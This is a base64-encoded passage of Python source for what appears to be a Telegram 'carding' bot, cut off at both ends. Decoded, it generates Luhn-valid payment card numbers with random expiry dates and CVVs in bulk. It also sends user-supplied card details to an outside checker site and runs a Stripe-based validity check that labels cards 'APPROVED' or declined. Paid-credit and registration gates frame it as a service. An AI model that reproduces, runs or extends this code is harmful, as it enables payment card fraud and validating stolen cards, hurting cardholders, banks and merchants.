gICAgICAgICAgICAgICAgICAgZGlnaXQgLT0gOQogICAgICAgICAgICBsdWhuX3N1bSArPSBkaWdpdAoKICAgICAgICBjaGVja19kaWdpdCA9ICgxMCAtIChsdWhuX3N1bSAlIDEwKSkgJSAxMAogICAgICAgIGZ1bGxfY2FyZF9udW1iZXIgPSBjYXJkX251bWJlcls6LTFdICsgc3RyKGNoZWNrX2RpZ2l0KQoKICAgICAgICBpZiBmdWxsX2NhcmRfbnVtYmVyIG5vdCBpbiBnZW5lcmF0ZWRfY2FyZHM6CiAgICAgICAgICAgIGdlbmVyYXRlZF9jYXJkcy5hZGQoZnVsbF9jYXJkX251bWJlcikKCiAgICBnZW5lcmF0ZWRfcmVzdWx0cyA9IFtdCiAgICBmb3IgY2FyZCBpbiBnZW5lcmF0ZWRfY2FyZHM6CiAgICAgICAgZXhwX21vbnRoID0gbW9udGggaWYgbW9udGggZWxzZSBzdHIocmFuZG9tLnJhbmRpbnQoMSwgMTIpKS56ZmlsbCgyKQogICAgICAgIGV4cF95ZWFyID0geWVhciBpZiB5ZWFyIGVsc2Ugc3RyKHJhbmRvbS5yYW5kaW50KDI0LCAzMCkpCiAgICAgICAgY3Z2X2NvZGUgPSAoCiAgICAgICAgICAgIGN2diBpZiBjdnYKICAgICAgICAgICAgZWxzZSBzdHIocmFuZG9tLnJhbmRpbnQoMTAwLCA5OTkpKS56ZmlsbCgzKSBpZiBjYXJkX3R5cGUgIT0gJ0FNRVgnCiAgICAgICAgICAgIGVsc2Ugc3RyKHJhbmRvbS5yYW5kaW50KDEwMDAsIDk5OTkpKS56ZmlsbCg0KQogICAgICAgICkKICAgICAgICBnZW5lcmF0ZWRfcmVzdWx0cy5hcHBlbmQoZiJ7Y2FyZH18e2V4cF9tb250aH18e2V4cF95ZWFyfXx7Y3Z2X2NvZGV9IikKCiAgICByZXR1cm4gJ1xuJy5qb2luKGdlbmVyYXRlZF9yZXN1bHRzKQoKYXN5bmMgZGVmIGdlbmVyYXRlX2NvZGVfYmxvY2tzKGFsbF9jYXJkcyk6CiAgICBjb2RlX2Jsb2NrcyA9ICIiCiAgICBjYXJkcyA9IGFsbF9jYXJkcy5zcGxpdCgnXG4nKQogICAgZm9yIGNhcmQgaW4gY2FyZHM6CiAgICAgICAgY29kZV9ibG9ja3MgKz0gZiI8Y29kZT57Y2FyZH08L2NvZGU+XG4iCiAgICByZXR1cm4gY29kZV9ibG9ja3MKCmFzeW5jIGRlZiBnZW5fY2MoY2NfYmluLCBtb250aD1Ob25lLCB5ZWFyPU5vbmUsIGN2dj1Ob25lLCBhbW91bnQ9MTApOgogICAgcmV0dXJuIGF3YWl0IGx1aG5fY2FyZF9nZW5hcmF0b3IoY2NfYmluLCBtb250aCwgeWVhciwgY3Z2LCBhbW91bnQpCgpkZWYgYmNhbGxfZ2VuKGNsaWVudCwgbWVzc2FnZSk6CiAgICBsb29wID0gYXN5bmNpby5uZXdfZXZlbnRfbG9vcCgpCiAgICBhc3luY2lvLnNldF9ldmVudF9sb29wKGxvb3ApCiAgICBsb29wLnJ1bl91bnRpbF9jb21wbGV0ZShnZW5fY21kKGNsaWVudCwgbWVzc2FnZSkpCiAgICBsb29wLmNsb3NlKCkKCmFzeW5jIGRlZiBnZW5fY21kKGNsaWVudCwgbWVzc2FnZSk6CiAgICB1c2VyX2lkID0gc3RyKG1lc3NhZ2UuZnJvbV91c2VyLmlkKQogICAgCiAgICB0cnk6CiAgICAgICAgY2NzZGF0YSA9IG1lc3NhZ2UudGV4dC5zcGxpdCgpWzFdCiAgICAgICAgY2NfcGFydHMgPSBjY3NkYXRhLnNwbGl0KCJ8IikKICAgICAgICBjYyA9IGNjX3BhcnRzWzBdCiAgICAgICAgY2MgPSBjYy5yZXBsYWNlKCdcdTIwMGUnLCAnJykKICAgICAgICBtZXMgPSBjY19wYXJ0c1sxXSBpZiBsZW4oY2NfcGFydHMpID4gMSBlbHNlIE5vbmUKICAgICAgICBhbm8gPSBjY19wYXJ0c1syXSBpZiBsZW4oY2NfcGFydHMpID4gMiBlbHNlIE5vbmUKICAgICAgICBjdnYgPSBjY19wYXJ0c1szXSBpZiBsZW4oY2NfcGFydHMpID4gMyBlbHNlIE5vbmUKICAgIGV4Y2VwdCBJbmRleEVycm9yOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAi4p2MIEludmFsaWQgRm9ybWF0ISBVc2U6XG5gL2dlbiA0NDc2OTd8MTJ8MjV8MTIzYCIsIHBhcnNlX21vZGU9Ik1hcmtkb3duIikKICAgICAgICByZXR1cm4KICAgIGFtb3VudCA9IDEwCiAgICB0cnk6CiAgICAgICAgYW1vdW50ID0gaW50KG1lc3NhZ2UudGV4dC5zcGxpdCgpWzJdKQogICAgZXhjZXB0IChJbmRleEVycm9yLCBWYWx1ZUVycm9yKToKICAgICAgICBwYXNzCiAgICBkZWxldGVfbXNnID0gYm90LnJlcGx5X3RvKG1lc3NhZ2UsICI8Yj5HZW5lcmF0aW5nLi4uPC9iPiIsIHBhcnNlX21vZGU9IkhUTUwiKQogICAgc3RhcnQgPSB0aW1lLnBlcmZfY291bnRlcigpCiAgICBnZXRiaW4gPSBhd2FpdCBnZXRfYmluX2RldGFpbHMoY2NbOjZdKQogICAgYnJhbmQsIHR5cGVfLCBsZXZlbCwgYmFuaywgY291bnRyeSwgZmxhZywgY3VycmVuY3kgPSBnZXRiaW4KICAgIGlmIGFtb3VudCA+IDEwMDAwOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAiPGI+4pqg77iPIE1heGltdW0gQWxsb3dlZDogMTBLPC9iPiIsIHBhcnNlX21vZGU9IkhUTUwiKQogICAgICAgIHJldHVybgogICAgYWxsX2NhcmRzID0gYXdhaXQgbHVobl9jYXJkX2dlbmFyYXRvcihjYywgbWVzLCBhbm8sIGN2diwgYW1vdW50KQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKCJkb3dubG9hZHMiKToKICAgICAgICBvcy5tYWtlZGlycygiZG93bmxvYWRzIikKICAgIGZpbGVuYW1lID0gZiJkb3dubG9hZHMve2Ftb3VudH14X0NDX0dlbmVyYXRlZF9CeV97dXNlcl9pZH0udHh0IgogICAgaWYgYW1vdW50ID09IDEwOgogICAgICAgIHJlc3BvbnNlX3RleHQgPSAoCiAgICAgICAgICAgIGYiLSDinIUg8J2QgvCdkIIg8J2QhvCdkJ7wnZCn8J2QnvCdkKvwnZCa8J2QrfCdkJ7wnZCdIPCdkJLwnZCu8J2QnPCdkJzwnZCe8J2QrPCdkKzwnZCf8J2QrvCdkKXwnZCl8J2QslxuIgogICAgICAgICAgICBmIi0g8J+UoiDwnZCB8J2QovCdkKc6IDxjb2RlPntjY308L2NvZGU+XG4iCiAgICAgICAgICAgIGYiLSDwn5SiIPCdkIDwnZCm8J2QqPCdkK7wnZCn8J2QrToge2Ftb3VudH1cblxuIgogICAgICAgICAgICBmInthd2FpdCBnZW5lcmF0ZV9jb2RlX2Jsb2NrcyhhbGxfY2FyZHMpfVxuIgogICAgICAgICAgICBmIi0g4oS577iPIHticmFuZH0gLSB7dHlwZV99IC0ge2xldmVsfVxuIgogICAgICAgICAgICBmIi0g8J+PmyDwnZCB8J2QmvCdkKfwnZCkOiB7YmFua31cbiIKICAgICAgICAgICAgZiItIPCfh7rwn4e4IPCdkILwnZCo8J2QrvCdkKfwnZCt8J2Qq/CdkLI6IHtjb3VudHJ5fSB7ZmxhZ31cblxuIgogICAgICAgICAgICBmIi0g4o+zIPCdkJPwnZCi8J2QpvCdkJ46IHt0aW1lLnBlcmZfY291bnRlcigpIC0gc3RhcnQ6LjJmfXNcbiIKICAgICAgICAgICAgZiItIPCfkaQgQ2hlY2tlZCBieSA8YSBocmVmPSd0ZzovL3VzZXI/aWQ9e21lc3NhZ2UuZnJvbV91c2VyLmlkfSc+e21lc3NhZ2UuZnJvbV91c2VyLmZpcnN0X25hbWV9PC9hPiIKICAgICAgICApCiAgICAgICAgYm90LmRlbGV0ZV9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgZGVsZXRlX21zZy5tZXNzYWdlX2lkKQogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCByZXNwb25zZV90ZXh0LCBwYXJzZV9tb2RlPSJIVE1MIikKICAgICAgICB0aW1lLnNsZWVwKDAuMSkKICAgIGVsc2U6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVuYW1lLCAidyIpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoYWxsX2NhcmRzKQogICAgICAgIGNhcHRpb24gPSBmIiIiCi0g8J+UoiDwnZCB8J2QovCdkKc6IDxjb2RlPntjY308L2NvZGU+Ci0g8J+UoiDwnZCA8J2QpvCdkKjwnZCu8J2Qp/CdkK06IHthbW91bnR9CgotIOKEue+4jyB7YnJhbmR9IC0ge3R5cGVffSAtIHtsZXZlbH0KLSDwn4+bIPCdkIHwnZCa8J2Qp/CdkKQ6IHtiYW5rfQotIPCfh7rwn4e4IPCdkILwnZCo8J2QrvCdkKfwnZCt8J2Qq/CdkLI6IHtjb3VudHJ5fSB7ZmxhZ30ge2N1cnJlbmN5fQoKLSDij7Mg8J2Qk/CdkKLwnZCm8J2Qnjoge3RpbWUucGVyZl9jb3VudGVyKCkgLSBzdGFydDouMmZ9cwotIPCfkaQgQ2hlY2tlZCBieSA8YSBocmVmPSJ0ZzovL3VzZXI/aWQ9e21lc3NhZ2UuZnJvbV91c2VyLmlkfSI+e21lc3NhZ2UuZnJvbV91c2VyLmZpcnN0X25hbWV9PC9hPiDipL8gUHJlbWl1bSDipL4KIiIiCiAgICAgICAgYm90LmRlbGV0ZV9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgZGVsZXRlX21zZy5tZXNzYWdlX2lkKQogICAgICAgIHdpdGggb3BlbihmaWxlbmFtZSwgInJiIikgYXMgZG9jX2ZpbGU6CiAgICAgICAgICAgIGJvdC5zZW5kX2RvY3VtZW50KAogICAgICAgICAgICAgICAgbWVzc2FnZS5jaGF0LmlkLAogICAgICAgICAgICAgICAgZG9jX2ZpbGUsCiAgICAgICAgICAgICAgICBjYXB0aW9uPWNhcHRpb24sCiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlPSJIVE1MIiwKICAgICAgICAgICAgICAgIHJlcGx5X3RvX21lc3NhZ2VfaWQ9bWVzc2FnZS5tZXNzYWdlX2lkCiAgICAgICAgICAgICkKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLnJlbW92ZShmaWxlbmFtZSkKICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgIHBhc3MKICAgICAgICB0aW1lLnNsZWVwKDAuMSkKICAgICAgICAKZnJlZV91c2VycyA9IGxvYWRfZnJlZV91c2VycygpCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsnZ2VuJ10pICAgICAKZGVmIGdlbl9jb21tYW5kX2hhbmRsZXIobWVzc2FnZSk6CiAgICB1c2VyX2lkID0gc3RyKG1lc3NhZ2UuZnJvbV91c2VyLmlkKQogICAgCiAgICBiY2FsbF9nZW4oTm9uZSwgbWVzc2FnZSkKCgoKCmZyZWVfdXNlcnMgPSBsb2FkX2ZyZWVfdXNlcnMoKQpAYm90Lm1lc3NhZ2VfaGFuZGxlcihjb21tYW5kcz1bJ3BpbmcnXSkKZGVmIG8obWVzc2FnZSk6CiAgICBpZiBub3QgaXNfcmVnaXN0ZXJlZChtZXNzYWdlLmZyb21fdXNlci5pZCk6CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICJIZXksIHlvdSBhcmUgbm90IHJlZ2lzdGVyZWQuIFBsZWFzZSByZWdpc3RlciB1c2luZyAvcmVnaXN0ZXIgY21kLuKchSIpCiAgICAgICAgcmV0dXJuCiAgICAgICAgcmV0dXJuIAogICAgaWYgc3RyKG1lc3NhZ2UuZnJvbV91c2VyLmlkKSBub3QgaW4gYWRtaW46CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICLwn5qrIFlvdSBhcmUgbm90IGF1dGhvcml6ZWQgdG8gdXNlIHRoaXMgY29tbWFuZC4iKQogICAgICAgIHJldHVybgogICAgY21kX3BpbmcoYm90LCBtZXNzYWdlKQpAYm90Lm1lc3NhZ2VfaGFuZGxlcihjb21tYW5kcz1bJ2luZm8nXSkKZGVmIHNvKG1lc3NhZ2UpOgogICAgaWYgbm90IGlzX3JlZ2lzdGVyZWQobWVzc2FnZS5mcm9tX3VzZXIuaWQpOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAiSGV5LCB5b3UgYXJlIG5vdCByZWdpc3RlcmVkLiBQbGVhc2UgcmVnaXN0ZXIgdXNpbmcgL3JlZ2lzdGVyIGNtZC7inIUiKQogICAgICAgIHJldHVybgogICAgdXNlcl9pbmZvKGJvdCwgbWVzc2FnZSkKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9WydiaW4nXSkKZGVmIHNza3Nqc2pvKG1lc3NhZ2UpOgogICAgaWYgbm90IGlzX3JlZ2lzdGVyZWQobWVzc2FnZS5mcm9tX3VzZXIuaWQpOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAiSGV5LCB5b3UgYXJlIG5vdCByZWdpc3RlcmVkLiBQbGVhc2UgcmVnaXN0ZXIgdXNpbmcgL3JlZ2lzdGVyIGNtZC7inIUiKQogICAgICAgIHJldHVybgogICAgYSA9IGdldF9iaW5faW5mbyhib3QsIG1lc3NhZ2UpCiAgICBwcmludChhKQogICAgCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsncHAnXSkKZGVmIHNranNqKG1lc3NhZ2UpOgogICAgaWYgbm90IGlzX3JlZ2lzdGVyZWQobWVzc2FnZS5mcm9tX3VzZXIuaWQpOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAiSGV5LCB5b3UgYXJlIG5vdCByZWdpc3RlcmVkLiBQbGVhc2UgcmVnaXN0ZXIgdXNpbmcgL3JlZ2lzdGVyIGNtZC7inIUiKQogICAgICAgIHJldHVybgogICAgYSA9IGJvdC5yZXBseV90byhtZXNzYWdlLCI8Yj7ij7MgUHJvY2Vzc2luZyB5b3VyIHJlcXVlc3QuLi4gUGxlYXNlIHdhaXQuPC9iPiIscGFyc2VfbW9kZT0iSFRNTCIpCiAgICBjaGF0ID0gbWVzc2FnZS5mcm9tX3VzZXIuaWQKICAgIAogICAgY2MgPSBtZXNzYWdlLnRleHQuc3BsaXQoKVsxOl0KICAgIGlmIGxlbihjYykgIT0gMToKICAgICAgICByZXNwID0gIiIi4p2MIPCdkI/wnZCl8J2QnvCdkJrwnZCs8J2QniDwnZCp8J2Qq/CdkKjwnZCv8J2QovCdkJ3wnZCeIPCdkILwnZCCIPCdkJ3wnZCe8J2QrfCdkJrwnZCi8J2QpfCdkKwg8J2QmvCdkJ/wnZCt8J2QnvCdkKsgdGhlIGNvbW1hbmQuIFVzZTogPGNvZGU+L2NoayBjY3xtbXx5eXxjdnY8L2NvZGU+IiIiCiAgICAgICAgYm90LmVkaXRfbWVzc2FnZV90ZXh0KAogICAgICAgICAgICAgICAgY2hhdF9pZD1tZXNzYWdlLmNoYXQuaWQsCiAgICAgICAgICAgICAgICBtZXNzYWdlX2lkPWEubWVzc2FnZV9pZCwKICAgICAgICAgICAgICAgIHRleHQ9cmVzcCwKICAgICAgICAgICAgICAgIHBhcnNlX21vZGU9IkhUTUwiCiAgICAgICAgICAgICkKICAgIGVsc2U6CiAgICAgICAgaWYgb3AobWVzc2FnZS5mcm9tX3VzZXIuaWQpID09RmFsc2U6CiAgICAgICAgICAgIGJvdC5lZGl0X21lc3NhZ2VfdGV4dCgKICAgICAgICAgICAgICAgIGNoYXRfaWQ9bWVzc2FnZS5jaGF0LmlkLAogICAgICAgICAgICAgICAgbWVzc2FnZV9pZD1hLm1lc3NhZ2VfaWQsCiAgICAgICAgICAgICAgICB0ZXh0PSJZb3UgZG9udCBoYXZlIGVub3VnaCBjcmVkaXQiLAogICAgICAgICAgICAgICAgcGFyc2VfbW9kZT0iSFRNTCIKICAgICAgICAgICAgKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnBlcmZfY291bnRlcigpCiAgICAgICAgICAgIGNjID0gbWVzc2FnZS50ZXh0LnNwbGl0KCkKICAgICAgICAgICAgY2MgPSBjY1sxXQogICAgICAgICAgICBjYSA9IE5vbmUKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgICAgICAKICAgICAgICAgICAgCiAgICAgICAgICAgIGRhdGEgPSBnZXRfYmluKGNjKQogICAgICAgICAgICBpZiBkYXRhIGlzIE5vbmU6CiAgICAgICAgICAgICAgICBkYXRhID0ge30KICAgICAgICAgICAgYmFuayA9IGRhdGFbImJhbmsiXQogICAgICAgICAgICBjb3VudHJ5ID0gZGF0YS5nZXQoImNvdW50cnkiLCAiTi9BIikKICAgICAgICAgICAgc2NoZW1lID0gZGF0YS5nZXQoInNjaGVtZSIsICJOL0EiKQogICAgICAgICAgICB0eXBlXyA9IGRhdGEuZ2V0KCJ0eXBlIiwgIk4vQSIpCiAgICAgICAgICAgIGxldmVsID0gZGF0YS5nZXQoImxldmVsIiwgIk4vQSIpCiAgICAgICAgICAgIGJpbl9udW1iZXIgPSBjY1s6Nl0KICAgICAgICAgICAgaWYgYmluX251bWJlclswXSA9PSA0OgogICAgICAgICAgICAgICAgY2EgPSAiVmlzYSIKICAgICAgICAgICAgaWYgYmluX251bWJlclswXSA9PSA1OgogICAgICAgICAgICAgICAgY2EgPSAiTWFzdGVyQ2FyZCIKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAKICAgICAgICAgICAgdXJsID0gZiJodHRwczovL3dpZmlvdHAueHl6L2Noay5waHA/bGlzdGE9e2NjfSIKICAgIAogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCiAgICAgICAgICAgIGxhc3QgPSByZXNwb25zZS50ZXh0CiAgICAgICAgICAgIGVuZF90aW1lID0gdGltZS5wZXJmX2NvdW50ZXIoKQogICAgICAgICAgICAKICAgICAgICAgICAgZXhlY3V0aW9uX3RpbWUgPSBlbmRfdGltZSAtIHN0YXJ0X3RpbWUKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICLwnZeX8J2XsvCdl7DwnZe58J2XtvCdl7vwnZey8J2XsSIgaW4gbGFzdDoKICAgICAgICAgICAgICAgIGxhc3QgPSAi4p2MIPCdl5fwnZey8J2XsPCdl7nwnZe28J2Xu/Cdl7LwnZexIgogICAgICAgICAgICByZXNwID0gZiIiIiDwnZCC8J2QofCdkJ7wnZCc8J2QpPCdkJ7wnZCdIPCdkILwnZCa8J2Qq/CdkJ0g8J+SswrilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHijZ8K4pSD8J2QgvCdkIIgPGNvZGU+e2NjfTwvY29kZT7ilJfilIHilIHilIHilIHilIHilIHilIHiipsK8J2QhvCdkJrwnZCt8J2QnvCdkLDwnZCa8J2QsjogIDxiPlNUUklQRSBBVVRIPC9iPiAK8J2QkfCdkJ7wnZCs8J2QqfCdkKjwnZCn8J2QrPCdkJ46ICB7bGFzdH0gCiAgICAgICAgCvCdkIjwnZCn8J2Qn/CdkKg6IHtiaW5fbnVtYmVyfSB7Y2F9CvCdkILwnZCo8J2QrvCdkKfwnZCt8J2Qq/CdkLI6IHtjb3VudHJ5fQrwnZCB8J2QmvCdkKfwnZCkOiB7YmFua30KICAgICAgICAK8J2Qk/CdkKLwnZCm8J2Qnjoge2V4ZWN1dGlvbl90aW1lOi4yZn0g8J2QrPCdkJ7wnZCc8J2QqPCdkKfwnZCdCjxiPlJlcSBieSA6PC9iPiBAe21lc3NhZ2UuZnJvbV91c2VyLnVzZXJuYW1lfSIiIgogICAgICAgICAgICBib3QuZWRpdF9tZXNzYWdlX3RleHQoY2hhdF9pZD1tZXNzYWdlLmNoYXQuaWQsbWVzc2FnZV9pZD1hLm1lc3NhZ2VfaWQsdGV4dD1yZXNwLHBhcnNlX21vZGU9IkhUTUwiKQogICAgCgpAYm90Lm1lc3NhZ2VfaGFuZGxlcihjb21tYW5kcz1bJ2NoayddKQpkZWYgYmh1ZmdoKG1lc3NhZ2UpOgogICAgaWYgbm90IGlzX3JlZ2lzdGVyZWQobWVzc2FnZS5mcm9tX3VzZXIuaWQpOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAiSGV5LCB5b3UgYXJlIG5vdCByZWdpc3RlcmVkLiBQbGVhc2UgcmVnaXN0ZXIgdXNpbmcgL3JlZ2lzdGVyIGNtZC7inIUiKQogICAgICAgIHJldHVybgogICAgYSA9IGJvdC5yZXBseV90byhtZXNzYWdlLCI8Yj7ij7MgUHJvY2Vzc2luZyB5b3VyIHJlcXVlc3QuLi4gUGxlYXNlIHdhaXQuPC9iPiIscGFyc2VfbW9kZT0iSFRNTCIpCiAgICBjaGFyX2lkID0gbWVzc2FnZS5mcm9tX3VzZXIuaWQKICAgIGNjID0gbWVzc2FnZS50ZXh0LnNwbGl0KClbMTpdCiAgICBpZiBsZW4oY2MpICE9IDE6CiAgICAgICAgcmVzcCA9ICIiIuKdjCDwnZCP8J2QpfCdkJ7wnZCa8J2QrPCdkJ4g8J2QqfCdkKvwnZCo8J2Qr/CdkKLwnZCd8J2QniDwnZCC8J2QgiDwnZCd8J2QnvCdkK3wnZCa8J2QovCdkKXwnZCsIPCdkJrwnZCf8J2QrfCdkJ7wnZCrIHRoZSBjb21tYW5kLiBVc2U6IDxjb2RlPi9jaGsgY2N8bW18eXl8Y3Z2PC9jb2RlPiIiIgogICAgICAgIGJvdC5lZGl0X21lc3NhZ2VfdGV4dCgKICAgICAgICAgICAgICAgIGNoYXRfaWQ9bWVzc2FnZS5jaGF0LmlkLAogICAgICAgICAgICAgICAgbWVzc2FnZV9pZD1hLm1lc3NhZ2VfaWQsCiAgICAgICAgICAgICAgICB0ZXh0PXJlc3AsCiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlPSJIVE1MIgogICAgICAgICAgICApCiAgICBlbHNlOgogICAgICAgIGlmIG9wKG1lc3NhZ2UuZnJvbV91c2VyLmlkKSA9PUZhbHNlOgogICAgICAgICAgICBib3QuZWRpdF9tZXNzYWdlX3RleHQoCiAgICAgICAgICAgICAgICBjaGF0X2lkPW1lc3NhZ2UuY2hhdC5pZCwKICAgICAgICAgICAgICAgIG1lc3NhZ2VfaWQ9YS5tZXNzYWdlX2lkLAogICAgICAgICAgICAgICAgdGV4dD0iWW91IGRvbnQgaGF2ZSBlbm91Z2ggY3JlZGl0IiwKICAgICAgICAgICAgICAgIHBhcnNlX21vZGU9IkhUTUwiCiAgICAgICAgICAgICkKICAgICAgICBlbHNlOgogICAgICAgICAgICBjYyA9IG1lc3NhZ2UudGV4dC5zcGxpdCgpCiAgICAgICAgICAgIGNjID0gY2NbMV0KICAgICAgICAgICAgY2EgPSBOb25lCiAgICAgICAgICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnBlcmZfY291bnRlcigpCiAgICAgICAgICAgIGxhc3QgPSBUZWxlKGNjKQogICAgICAgICAgICBsYXN0ID0gc3RyKGxhc3QpCiAgICAgICAgICAgIAogICAgICAgICAgICBkYXRhID0gZ2V0X2JpbihjYykKICAgICAgICAgICAgaWYgZGF0YSBpcyBOb25lOgogICAgICAgICAgICAgICAgZGF0YSA9IHt9CiAgICAgICAgICAgIGJhbmsgPSBkYXRhWyJiYW5rIl0KICAgICAgICAgICAgY291bnRyeSA9IGRhdGEuZ2V0KCJjb3VudHJ5IiwgIk4vQSIpCiAgICAgICAgICAgIHNjaGVtZSA9IGRhdGEuZ2V0KCJzY2hlbWUiLCAiTi9BIikKICAgICAgICAgICAgdHlwZV8gPSBkYXRhLmdldCgidHlwZSIsICJOL0EiKQogICAgICAgICAgICBsZXZlbCA9IGRhdGEuZ2V0KCJsZXZlbCIsICJOL0EiKQogICAgICAgICAgICBiaW5fbnVtYmVyID0gY2NbOjZdCiAgICAgICAgICAgIGlmIGJpbl9udW1iZXJbMF0gPT0gNDoKICAgICAgICAgICAgICAgIGNhID0gIlZpc2EiCiAgICAgICAgICAgIGlmIGJpbl9udW1iZXJbMF0gPT0gNToKICAgICAgICAgICAgICAgIGNhID0gIk1hc3RlckNhcmQiCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIGVuZF90aW1lID0gdGltZS5wZXJmX2NvdW50ZXIoKQogICAgICAgICAgICAKICAgICAgICAgICAgZXhlY3V0aW9uX3RpbWUgPSBlbmRfdGltZSAtIHN0YXJ0X3RpbWUKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiAnWW91ciBjYXJkIHdhcyBkZWNsaW5lZC4nIGluIGxhc3Q6CiAgICAgICAgICAgICAgICBsYXN0ID0gJ1lvdXIgY2FyZCB3YXMgZGVjbGluZWQuJwogICAgICAgICAgICBpZiAnc3VjY2VzcycgaW4gbGFzdDoKICAgICAgICAgICAgICAgIGxhc3QgPSAnQVBQUk9WRUQg4pyFJwogICAgICAgICAgICBpZiAnQ2FyZCBFeHBpcmVkJyBpbiBsYXN0OgogICAgICAgICAgICAgICAgbGFzdCA9ICdZb3VyIENhcmQgRXhwaXJlZCcKICAgICAgICAgICAgaWYgJ0xpdmUnIGluIGxhc3Q6CiAgICAgICAgICAgICAgICBsYXN0ID0gJ0FQUFJPVkVEIOKchScKICAgICAgICAgICAgaWYgJ1VuYWJsZSB0byBhdXRoZW50aWNhdGUnIGluIGxhc3Q6CiAgICAgICAgICAgICAgICBsYXN0ID0gJ0RlY2xpbmVkIC0gQ2FsbCBJc3N1ZXInCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICJVbmFibGUgdG8gYXV0aGVudGljYXRlIiBpbiBsYXN0IG9yICJDYXJkIEV4cGlyZWQiIG9yICJZb3VyIGNhcmQgd2FzIGRlY2xpbmVkLiI6CiAgICAgICAgICAgICAgICByZXNwID0gZiIiIiDwnZCC8J2QofCdkJ7wnZCc8J2QpPCdkJ7wnZCdIPCdkILwnZCa8J2Qq/CdkJ0g8J+SswrilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHijZ8K4pSD8J2QgvCdkIIgPGNvZGU+e2NjfTwvY29kZT7ilJfilIHilIHilIHilIHilIHilIHilIHiipsK8J2QhvCdkJrwnZCt8J2QnvCdkLDwnZCa8J2QsjogIDxiPlNUUklQRSBBVVRIPC9iPiAK8J2QkfCdkJ7wnZCs8J2QqfCdkKjwnZCn8J2QrPCdkJ46ICB7bGFzdH0gCiAgICAgICAgCvCdkIjwnZCn8J2Qn/CdkKg6IHtiaW5fbnVtYmVyfSB7Y2F9CvCdkILwnZCo8J2QrvCdkKfwnZCt8J2Qq/CdkLI6IHtjb3VudHJ5fQrwnZCB8J2QmvCdkKfwnZCkOiB7YmFua30KICAgICAgICAK8J2Qk/CdkKLwnZCm8J2Qnjoge2V4ZWN1dGlvbl90aW1lOi4yZn0g8J2QrPCdkJ7wnZCc8J2QqPCdkKfwnZCdCjxiPlJlcSBieSA6PC9iPiBAe21lc3NhZ2UuZnJvbV91c2VyLnVzZXJuYW1lfSIiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgI2JvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZCxmIkNhcmQgOiA8Y29kZT57Y2N9PC9jb2RlPlxuU3RhdHVzIDogRGVjbGluZeKdjFxuVGltZSB0YWtlbiA6IHtleGVjdXRpb25fdGltZTouMmZ9cyIscGFyc2VfbW9kZT0iSFRNTCIpCiAgICAgICAgICAgICAgICBib3QuZWRpdF9tZXNzYWdlX3RleHQoY2hhdF9pZD1tZXNzYWdlLmNoYXQuaWQsbWVzc2FnZV9pZD1hLm1lc3NhZ2VfaWQsdGV4dD1yZXNwLHBhcnNlX21vZGU9IkhUTUwiKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBlbGlmICdzdWNjZWVkZWQnIGluIGxhc3Qgb3IgJ0xpdmUnIGluIGxhc3Q6CiAgICAgICAgICAgICAgICByZXNwID0gZiIiIiDwnZCC8J2QofCdkJ7wnZCc8J2QpPCdkJ7wnZCdIPCdkILwnZCa8J2Qq/CdkJ0g8J+SswrilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHijZ8K4pSD8J2QgvCdkIIgPGNvZGU+e2NjfTwvY29kZT7ilJfilIHilIHilIHilIHilIHilIHilIHiipsK8J2QhvCdkJrwnZCt8J2QnvCdkLDwnZCa8J2QsjogIDxiPlNUUklQRSBBVVRIPC9iPiAK8J2QkfCdkJ7wnZCs8J2QqfCdkKjwnZCn8J2QrPCdkJ46ICBBUFBST1ZFRCDinIUgCiAgICAgICAgCvCdkIjwnZCn8J2Qn/CdkKg6IHtiaW5fbnVtYmVyfSB7Y2F9CvCdkILwnZCo8J2QrvCdkKfwnZCt8J2Qq/CdkLI6IHtjb3VudHJ5fQrwnZCB8J2QmvCdkKfwnZCkOiB7YmFua30KICAgICAgICAK8J2Qk/CdkKLwnZCm8J2Qnjoge2V4ZWN1dGlvbl90aW1lOi4yZn0g8J2QrPCdkJ7wnZCc8J2QqPCdkKfwnZCdCjxiPlJlcSBieSA6PC9iPiBAe21lc3NhZ2UuZnJvbV91c2VyLnVzZXJuYW1lfSIiIgogICAgICAgICAgICAgICAgYm90L